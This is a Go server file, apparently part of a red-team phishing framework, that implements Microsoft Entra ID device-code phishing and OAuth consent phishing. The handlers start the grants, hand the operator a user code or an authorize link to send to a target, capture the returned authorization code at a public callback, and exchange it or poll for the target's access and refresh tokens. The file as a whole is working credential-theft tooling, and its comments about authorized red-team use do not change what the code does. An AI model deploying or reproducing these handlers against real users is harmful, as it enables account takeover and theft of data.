package server

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type deviceCodeSession struct {
	DeviceCode              string `json:"device_code"`
	UserCode                string `json:"user_code"`
	VerificationURI         string `json:"verification_uri"`
	VerificationURIComplete string `json:"verification_uri_complete"`
	ExpiresIn               int    `json:"expires_in"`
	Interval                int    `json:"interval"`
	Message                 string `json:"message"`
	Tenant                  string `json:"tenant"`
	ClientID                string `json:"client_id"`
	StartedAt               time.Time
}

var (
	deviceCodeMu   sync.Mutex
	deviceCodeSess = map[string]*deviceCodeSession{}
)

// handleDeviceCodeStart begins an OAuth 2.0 device-code grant against Entra ID
// (or a custom tenant). Authorized red-team use only; the operator supplies
// their own client_id. Tokens are never persisted — poll returns them once.
func (s *Server) handleDeviceCodeStart(c *gin.Context) {
	var req struct {
		Tenant   string `json:"tenant"`
		ClientID string `json:"client_id"`
		Scope    string `json:"scope"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	tenant := strings.TrimSpace(req.Tenant)
	if tenant == "" {
		tenant = "organizations"
	}
	if req.ClientID == "" {
		respondError(c, http.StatusBadRequest, "client_id is required (use a lab app registration)")
		return
	}
	scope := req.Scope
	if scope == "" {
		scope = "https://graph.microsoft.com/.default offline_access"
	}
	endpoint := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode", url.PathEscape(tenant))
	form := url.Values{"client_id": {req.ClientID}, "scope": {scope}}
	httpReq, err := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		respondError(c, http.StatusInternalServerError, "request build failed")
		return
	}
	httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		respondError(c, http.StatusBadGateway, "device-code request failed (need outbound HTTPS to login.microsoftonline.com)")
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode >= 300 {
		respondError(c, http.StatusBadGateway, "IdP rejected device-code start")
		return
	}
	var sess deviceCodeSession
	if err := json.Unmarshal(body, &sess); err != nil {
		respondError(c, http.StatusBadGateway, "invalid IdP response")
		return
	}
	sess.Tenant = tenant
	sess.ClientID = req.ClientID
	sess.StartedAt = time.Now()
	id := sess.DeviceCode
	if len(id) > 16 {
		id = id[:16]
	}
	deviceCodeMu.Lock()
	deviceCodeSess[id] = &sess
	deviceCodeMu.Unlock()
	s.LogAuditRecord(c, "device_code_start", "identity", "", tenant+" "+req.ClientID, true, nil)
	respond(c, gin.H{
		"id":                        id,
		"user_code":                 sess.UserCode,
		"verification_uri":          sess.VerificationURI,
		"verification_uri_complete": sess.VerificationURIComplete,
		"expires_in":                sess.ExpiresIn,
		"interval":                  sess.Interval,
		"message":                   sess.Message,
	})
}

func (s *Server) handleDeviceCodePoll(c *gin.Context) {
	id := c.Param("id")
	deviceCodeMu.Lock()
	sess := deviceCodeSess[id]
	deviceCodeMu.Unlock()
	if sess == nil {
		respondError(c, http.StatusNotFound, "session not found")
		return
	}
	endpoint := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", url.PathEscape(sess.Tenant))
	form := url.Values{
		"grant_type":  {"urn:ietf:params:oauth:grant-type:device_code"},
		"client_id":   {sess.ClientID},
		"device_code": {sess.DeviceCode},
	}
	httpReq, _ := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(form.Encode()))
	httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		respondError(c, http.StatusBadGateway, "token poll failed")
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	var parsed map[string]any
	_ = json.Unmarshal(body, &parsed)
	if _, ok := parsed["access_token"]; ok {
		deviceCodeMu.Lock()
		delete(deviceCodeSess, id)
		deviceCodeMu.Unlock()
		s.LogAuditRecord(c, "device_code_token", "identity", "", sess.Tenant, true, nil)
	}
	c.Data(resp.StatusCode, "application/json", body)
}

// ── Entra OAuth consent phishing (authorization-code grant) ─────────────────
// Operator supplies a lab app registration. Tokens are held in memory and
// returned once on exchange — never persisted.

type consentSession struct {
	Tenant       string
	ClientID     string
	ClientSecret string
	RedirectURI  string
	Scope        string
	State        string
	Code         string
	CreatedAt    time.Time
}

var (
	consentMu   sync.Mutex
	consentSess = map[string]*consentSession{}
)

func buildConsentAuthorizeURL(sess *consentSession) string {
	q := url.Values{
		"client_id":     {sess.ClientID},
		"response_type": {"code"},
		"redirect_uri":  {sess.RedirectURI},
		"response_mode": {"query"},
		"scope":         {sess.Scope},
		"state":         {sess.State},
	}
	return fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/authorize?%s",
		url.PathEscape(sess.Tenant), q.Encode())
}

func (s *Server) handleConsentStart(c *gin.Context) {
	var req struct {
		Tenant       string `json:"tenant"`
		ClientID     string `json:"client_id"`
		ClientSecret string `json:"client_secret"`
		RedirectURI  string `json:"redirect_uri"`
		Scope        string `json:"scope"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.ClientID == "" {
		respondError(c, http.StatusBadRequest, "client_id is required (use a lab app registration)")
		return
	}
	if req.RedirectURI == "" {
		respondError(c, http.StatusBadRequest, "redirect_uri is required and must match the lab app registration")
		return
	}
	tenant := strings.TrimSpace(req.Tenant)
	if tenant == "" {
		tenant = "organizations"
	}
	scope := req.Scope
	if scope == "" {
		scope = "https://graph.microsoft.com/.default offline_access"
	}
	state := fmt.Sprintf("%d", time.Now().UnixNano())
	sess := &consentSession{
		Tenant:       tenant,
		ClientID:     req.ClientID,
		ClientSecret: req.ClientSecret,
		RedirectURI:  req.RedirectURI,
		Scope:        scope,
		State:        state,
		CreatedAt:    time.Now(),
	}
	consentMu.Lock()
	consentSess[state] = sess
	consentMu.Unlock()
	s.LogAuditRecord(c, "consent_start", "identity", "", tenant+" "+req.ClientID, true, nil)
	respond(c, gin.H{
		"id":            state,
		"authorize_url": buildConsentAuthorizeURL(sess),
		"state":         state,
		"redirect_uri":  sess.RedirectURI,
		"note":          "Register redirect_uri on the lab app. The public callback is GET /phishing/oauth/callback.",
	})
}

func (s *Server) handleOAuthCallback(c *gin.Context) {
	state := c.Query("state")
	code := c.Query("code")
	errMsg := c.Query("error")
	if state == "" {
		c.String(http.StatusBadRequest, "missing state")
		return
	}
	consentMu.Lock()
	sess := consentSess[state]
	if sess != nil && code != "" {
		sess.Code = code
	}
	consentMu.Unlock()
	if sess == nil {
		c.String(http.StatusNotFound, "unknown consent session")
		return
	}
	if errMsg != "" {
		c.Header("Content-Type", "text/html; charset=utf-8")
		c.String(http.StatusOK, "<html><body><p>authorization declined</p></body></html>")
		return
	}
	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, "<html><body><p>captured</p></body></html>")
}

func (s *Server) handleConsentStatus(c *gin.Context) {
	id := c.Param("id")
	consentMu.Lock()
	sess := consentSess[id]
	consentMu.Unlock()
	if sess == nil {
		respondError(c, http.StatusNotFound, "session not found")
		return
	}
	respond(c, gin.H{
		"id":        id,
		"has_code":  sess.Code != "",
		"tenant":    sess.Tenant,
		"client_id": sess.ClientID,
	})
}

func (s *Server) handleConsentExchange(c *gin.Context) {
	id := c.Param("id")
	consentMu.Lock()
	sess := consentSess[id]
	consentMu.Unlock()
	if sess == nil {
		respondError(c, http.StatusNotFound, "session not found")
		return
	}
	if sess.Code == "" {
		respondError(c, http.StatusConflict, "authorization code not captured yet")
		return
	}
	endpoint := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", url.PathEscape(sess.Tenant))
	form := url.Values{
		"grant_type":   {"authorization_code"},
		"client_id":    {sess.ClientID},
		"code":         {sess.Code},
		"redirect_uri": {sess.RedirectURI},
	}
	if sess.ClientSecret != "" {
		form.Set("client_secret", sess.ClientSecret)
	}
	httpReq, err := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		respondError(c, http.StatusInternalServerError, "request build failed")
		return
	}
	httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		respondError(c, http.StatusBadGateway, "token exchange failed (need outbound HTTPS to login.microsoftonline.com)")
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode < 300 {
		consentMu.Lock()
		delete(consentSess, id)
		consentMu.Unlock()
		s.LogAuditRecord(c, "consent_token", "identity", "", sess.Tenant, true, nil)
	}
	c.Data(resp.StatusCode, "application/json", body)
}
